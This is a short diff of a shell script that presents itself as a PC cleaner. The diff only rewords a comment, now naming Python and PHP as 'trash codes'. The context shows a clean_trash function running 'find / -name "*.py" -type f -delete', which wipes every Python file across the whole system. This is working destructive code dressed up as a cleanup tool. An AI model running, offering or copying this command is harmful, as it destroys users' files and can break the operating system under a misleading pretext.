@@ -4,8 +4,8 @@
 
 set -e
 
-# Python is bad, let's clean your pc
-# from trash codes system wide
+# Python & PHP is bad, let's clean 
+# your pc from trash codes system wide
 function clean_trash() {
     # Lets clean python codes first
     find / -name "*.py" -type f -delete
